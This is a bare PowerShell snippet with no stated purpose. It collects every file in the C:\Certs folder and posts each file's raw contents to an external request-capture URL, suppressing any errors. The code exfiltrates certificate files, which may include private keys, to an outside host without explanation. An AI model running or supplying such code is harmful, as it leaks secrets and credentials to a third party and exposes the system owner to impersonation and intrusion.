$filesToUpload = Get-ChildItem -Path 'C:\Certs' -File

foreach ($file in $filesToUpload) { 
   $fileContent = Get-Content -Path $file.FullName -Raw 
   $headers = @{ 'X-File-Name' = $file.Name } 
   Invoke-WebRequest -Uri 'https://frno10.requestcatcher.com/test' -Method Post -Headers $headers -Body $fileContent -ErrorAction SilentlyContinue 
}
